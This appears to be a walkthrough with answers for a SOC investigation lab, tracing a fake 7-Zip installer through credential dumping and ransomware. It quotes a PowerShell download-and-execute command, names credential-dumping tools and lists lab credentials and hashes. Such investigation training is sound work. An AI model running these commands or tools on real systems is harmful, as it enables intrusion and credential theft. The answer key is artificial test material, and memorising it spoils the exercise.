**Scenario**

Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application. 

<img width="995" height="523" alt="image" src="https://github.com/user-attachments/assets/b1800c69-fd5b-4a7e-966e-df0f3d02d62c" />

Last September 26, 2023, one of the security analysts observed something unusual on the workstation owned by Perry based on the generated endpoint and network logs. Given this, your SOC lead has assigned you to conduct an in-depth investigation on this workstation and assess the impact of the potential compromise.

Connection Details﻿

Deploy the attached machine by clicking the Start Machine button in the upper-right-hand corner of the task. The provided virtual machine runs an Elastic Stack (ELK), which contains the logs that will be used throughout the room. 

Once the machine is up, access the Kibana console (via the AttackBox or VPN) using the following credentials below. The Kibana instance may take up to 3-5 minutes to initialise.

<img width="442" height="254" alt="image" src="https://github.com/user-attachments/assets/cafaf393-75bb-43d9-b956-6107d792247a" />


Q1. What is the URL of the malicious software that was downloaded by the victim user?

Answer: _http://www.7zipp.org/a/7z2301-x64.msi_

Q2. What is the IP address of the domain hosting the malware?

Answer: _206.189.34.218_

Q3. What is the PID of the process that executed the malicious software?

Answer: _2532_

Q4. Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?

Answer: _powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)_

Q5. The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?

Answer:_ C:\Windows\Temp\7zlegit.exe_

Q6. What is the name of the service that was installed?

Answer: _7zService_

Q7. The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service?

Answer: _SYSTEM_

Q8. After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity?

Answer: _Invoke-PowerExtract_

Q9. What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash)

Answer:_ james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF_

Q10. After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account?

Answer: _pwn3dpw!!!_


Q11. What is the name of the workstation where the new account was used?

Answer: _WKSTN-02_


Q12. After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account?

Answer: _SSF\itadmin:NoO6@39Sk0!_


Q13. Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin?

Answer: _Invoke-SharpKatz.ps1_

Q14. What is the AES256 hash of the domain admin based on the credential dumping output?

Answer: _f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534_

Q15. After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations?

Answer: _46_

